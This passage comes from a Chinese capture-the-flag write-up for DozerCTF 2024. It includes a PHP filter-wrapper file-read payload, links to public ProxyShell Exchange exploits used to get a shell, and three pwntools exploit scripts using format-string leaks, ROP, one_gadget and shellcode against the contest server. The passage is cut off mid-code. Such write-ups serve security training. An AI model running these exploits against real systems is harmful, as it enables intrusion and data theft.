alt="rce1"></p><h2 id="very-long-access"><a href="#very-long-access" class="headerlink" title="very_long_access"></a>very_long_access</h2><p>下载下来简要看一下内容吧，问了一下gpt,回答如下：</p><p>这看起来像是一个网络服务器的日志条目。它包括了一个时间戳、用户代理字符串（表明是运行在 Windows 10 上的 Chrome 版本 108.0.0.0 浏览器），以及一个对资源”A”的GET请求，请求的数据大小为34760字节。有什么关于这个日志条目你想要了解或讨论的吗？</p><p>感觉和wireshark的题目有点像，和时间有关系，发现时间并不是按顺序写的，撸个脚本排一下序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取日志文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;very_long_access.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    log_entries = file.readlines()<br><br><span class="hljs-comment"># 将日志条目解析为元组列表，每个元组包含时间戳和原始日志条目</span><br>parsed_entries = []<br><span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> log_entries:<br>    timestamp_string = entry.split(<span class="hljs-string">&quot; - &quot;</span>)[<span class="hljs-number">0</span>]<br>    parsed_entry = (timestamp_string, entry)<br>    parsed_entries.append(parsed_entry)<br><br><span class="hljs-comment"># 按时间先后顺序排序日志条目</span><br>sorted_entries = <span class="hljs-built_in">sorted</span>(parsed_entries, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">0</span>])<br><br><span class="hljs-comment"># 写入排序后的日志条目到新文件中</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sorted_access_logs.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> sorted_entries:<br>        file.write(entry[<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;日志条目已按时间先后顺序排列并保存到 sorted_access_logs.txt 文件中。&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>排完看后面估计要把get&#x2F;后面的提出来才能有些头绪，再撸个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打开文件 very_long_access.txt 以读取模式</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;sorted_access_logs.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-comment"># 创建一个空列表，用于存储每行的数据</span><br>    lines = []<br>    <span class="hljs-comment"># 逐行读取文件内容</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-comment"># 找到每行中 &quot;GET /&quot; 后面的内容，并添加到列表中</span><br>        start_index = line.find(<span class="hljs-string">&quot;GET /&quot;</span>) + <span class="hljs-number">5</span><br>        end_index = line.find(<span class="hljs-string">&quot; &quot;</span>, start_index)<br>        request = line[start_index:end_index]<br>        lines.append(request)<br><br><span class="hljs-comment"># 将提取到的数据拼接成一行</span><br>get_requests = <span class="hljs-string">&#x27;&#x27;</span>.join(lines)<br><br><span class="hljs-comment"># 将拼接后的数据写入到新的文件 get_requests.txt 中</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;get_requests.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(get_requests)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提取并写入完成！&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>ctrl+f搜看看有没有惊喜，确实有</p><p><img src="/../../images/dozerctf2024/access.png" alt="access"></p><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h2><p>上面一个可以输入，下面一个好像偏rce,尝试输入了一会并没有得到答案。我试了一下robots.txt，出来了一个dozer_f1ag.php,直接开开不了，那就代码审计一下吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html:/tmp&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;function.php&#x27;</span>;<br><span class="hljs-variable">$func</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>]:<span class="hljs-string">&#x27;filters&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;function.php&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;去找fun吧！！！&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ini_set,规定了访问路径在这两个里面。</p><p>给file赋值</p><p>然后检查URL查询字符串（$_GET）中是否设置了’function’参数。如果’function’参数已设置，则将其值赋给变量$func；否则，将字符串’filters’赋给$func。</p><p>call_user_func这个函数前阵子刚碰过，试过几次觉得应该是用extract解决。该函数用于将数组中的键名作为变量名，键值作为变量值，导入到当前符号表中。</p><p>strpos用于检测有没有，有才可以include,应该是用伪协议,覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=dozer_f1ag.php</span><br></code></pre></td></tr></table></figure><p>可是要有function.php,再改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/function.php/convert.base64-encode/resource=dozer_f1ag.php</span><br></code></pre></td></tr></table></figure><p>最后构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">extract</span>&amp;<span class="hljs-title">file</span>=<span class="hljs-title">php</span>://<span class="hljs-title">filter</span>/<span class="hljs-title">function</span>.<span class="hljs-title">php</span>/<span class="hljs-title">convert</span>.<span class="hljs-title">base64</span>-<span class="hljs-title">encode</span>/<span class="hljs-title">resource</span>=<span class="hljs-title">dozer_f1ag</span>.<span class="hljs-title">php</span></span><br></code></pre></td></tr></table></figure><p>解一下base64<img src="/../../images/dozerctf2024/ser.png" alt="ser"></p><h2 id="上春山"><a href="#上春山" class="headerlink" title="上春山"></a>上春山</h2><p>二月天杨柳醉春烟..搞错了，看题目。</p><p>什么玩意，我自己整理了一下<img src="/../../images/dozerctf2024/%E4%B8%8A%E6%98%A5%E5%B1%B1.png" alt="上春山"></p><p>分析一下，一开始对暗号，然后聊天说东方有沉船搞个门路赚钱，最后flag应该和沉船有关系。说到这就应该好好拷打出题人了</p><p>官方给了提示不一定在国内，出名的奢侈的。</p><p>我们锁定范围(1911-1949年，出名，国外，奢侈，沉船)</p><p>这不就是出名的泰坦尼克号嘛，最后官方说的知道船可以问，直接给我一串汉字，我们谦虚一下，面向答案的wp写一下。</p><p>载柳度载汪分中中申申秒载爱度中申分载中句月秒</p><p>根据江湖黑话，上面的应该都是数字转化而来的，也就是当时沉船的经纬度转黑话，黑话再转MD5就行，最后就是flag.(好好拷打出题人)</p><h2 id="se"><a href="#se" class="headerlink" title="se"></a>se</h2><p>wav的题目，一般都挺简单的吧</p><p>听一下类似电话拨号的声音，网上的网站一把梭</p><p><img src="/../../images/dozerctf2024/se.png" alt="se"></p><p>962764453，卡壳了不知道接下来怎么写，emmmmm</p><p>还好有万能的队友，用silenteye可以提出zip，再用这个密码就可以得到flag了。</p><h2 id="shuiyin"><a href="#shuiyin" class="headerlink" title="shuiyin"></a>shuiyin</h2><p>嘿嘿，出题人总是不仔细啊，直接给flag也没下，那我接着面向答案的wp了。</p><p>按道理应该是最右边的图片，猜测是盲水印，拖到软件里面解一下就行了吧，然后可以得到flag,(估计本来就简单，上的太匆忙了)</p><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>正常答题就行，最后想抢手速也是于事无补。</p><p>以下部分由队友完成我只是负责拼装。</p><h2 id="简单的域渗透III-flag1"><a href="#简单的域渗透III-flag1" class="headerlink" title="简单的域渗透III-flag1"></a>简单的域渗透III-flag1</h2><p>发现被重定向</p><p><img src="/../../images/dozerctf2024/flag1.png" alt="flag1"></p><p>根据题目发现是exchange+office365</p><p><img src="/../../images/dozerctf2024/flag3.png" alt="flag3"></p><p>查阅文章<a href="https://mp.weixin.qq.com/s/O6a40449vTKWUXS4kwD9xA">记一次曲折的exchange漏洞利用-ProxyMaybeShell (qq.com)</a></p><p>proxyshell一梭拿到token</p><p>脚本代码：</p><p><a href="https://github.com/dmaasland/proxyshell-poc">https://github.com/dmaasland/proxyshell-poc</a></p><p><img src="/../../images/dozerctf2024/flag4.png" alt="flag4"></p><p>从github上撸到<a href="https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py#L3%E7%9B%B4%E6%8E%A5%E4%B8%80%E6%8A%8A%E6%A2%AD">https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py#L3直接一把梭</a></p><p><img src="/../../images/dozerctf2024/flag5.png" alt="flag5"></p><p><img src="/../../images/dozerctf2024/flag6.png" alt="flag6"></p><p>拿到shell</p><p>群里桌面和vpn两hint，找到如下</p><p><img src="/../../images/dozerctf2024/flag7.png" alt="flag7"></p><p>tar解压取出password</p><p><img src="/../../images/dozerctf2024/flag8.png" alt="flag8"></p><p><img src="/../../images/dozerctf2024/flag9.png" alt="flag9"></p><p>flag{b5c1cd1c-45d8-4c5e-bf2e-d2b87419248f}</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="一个不对劲的溢出"><a href="#一个不对劲的溢出" class="headerlink" title="一个不对劲的溢出"></a>一个不对劲的溢出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32916</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;aa%37$pbb%36$pcc%35$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;username?\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;aa&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">231</span>-libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>p.recvuntil(<span class="hljs-string">&#x27;bb&#x27;</span>)<br>pie = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x0000A20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pie--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(pie))<br>p.recvuntil(<span class="hljs-string">&#x27;cc&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(canary))<br>pop_rdi = <span class="hljs-number">0x00a83</span>+pie<br>system = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base+<span class="hljs-number">0x001b3d88</span><br>ret = <span class="hljs-number">0x000A84</span><br>main = pie+<span class="hljs-number">0x0007F0</span><br>og = [<span class="hljs-number">0x4f2be</span>,<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]<br>og_yuan = [<span class="hljs-number">0x4f29e</span>,<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]<br>shell = libc_base+og_yuan[<span class="hljs-number">0</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xd0</span>-<span class="hljs-number">0x8</span>)+p64(canary)+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br><span class="hljs-comment">#payload+= p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br>payload+= p64(shell)<br>p.send(payload)<br>p.sendline(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="mid-pwn"><a href="#mid-pwn" class="headerlink" title="mid_pwn"></a>mid_pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32972</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi, 0x67616c66</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">xor rdi, rdi</span><br><span class="hljs-string">sub rdi, 100</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">xor rdx, rdx</span><br><span class="hljs-string">xor r10, r10</span><br><span class="hljs-string">mov rax, SYS_openat</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">push 3</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">push 0x1</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 0x100</span><br><span class="hljs-string">lea rbx, [rsp-8]</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">push SYS_readv</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">push 0x1</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 0x100</span><br><span class="hljs-string">lea rbx, [rsp+8]</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">push SYS_writev</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">231</span>+asm(shellcode)<br>p.sendlineafter(<span class="hljs-string">b&#x27;show me\n&#x27;</span>,shellcode)<br>p.recv()<br></code></pre></td></tr></table></figure><h2 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32944</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>glibc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>seed = libc.time(<span class="hljs-number">0</span>)<br>password = libc.rand(libc.srand(seed))<br>p.sendafter(<span class="hljs-string">&#x27;account:&#x27;</span>,<span class="hljs-string">&#x27;xiaochange&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;password:&#x27;</span>,<span class="hljs-built_in">str</span>(password))<br>pop_rdi = <span class="hljs-number">0x004014d3</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br>payload+= p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload+= p64(<span class="hljs-number">0x000401423</span>)<br>p.sendafter(<span class="hljs-string">&#x27;something\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~~\n&#x27;</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-glibc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>og = [<span class="hljs-number">0xe3afe</span>,<span class="hljs-number">0xe3b01</span>,<span class="hljs-number">0xe3b04</span>]<br>seed = libc.time(<span class="hljs-number">0</span>)<br>password = libc.rand(libc.srand(seed))<br>shell = libc_addr+og[<span class="hljs-number">1</span>]<br>p.sendafter(<span class="hljs-string">&#x27;account:&#x27;</span>,<span class="hljs-string">&#x27;xiaochange&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;password:&#x27;</span>,<span class="hljs-built_in">str</span>(password))<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br>payload+= p64(shell)<br>p.sendafter(<span class="hljs-string">&#x27;something\n&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="pppyyy"><a href="#pppyyy" class="headerlink" title="pppyyy"></a>pppyyy</h2><p>将pyc反编译，解方程组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *  <br><br><span class="hljs-comment"># 创建 14 个未知数  </span><br>nums = [Real(<span class="hljs-string">&#x27;nums%d&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]  <br><br>eqns = [  <br>(((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">12</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">3</span> == <span class="hljs-number">56</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">1</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">7</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">8</span>] * <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">12</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">3</span> == <span class="hljs-number">681</span>,<br>(((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">1</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">3</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">11</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>] * <span class="hljs-number">2</span> == <span class="hljs-number">1129</span>,<br>(((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">4</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">4</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">12</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>] * <span class="hljs-number">5</span> == <span class="hljs-number">55</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">1</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">6</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">9</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">673</span>,<br>(((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">3</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">4</span>] * <span 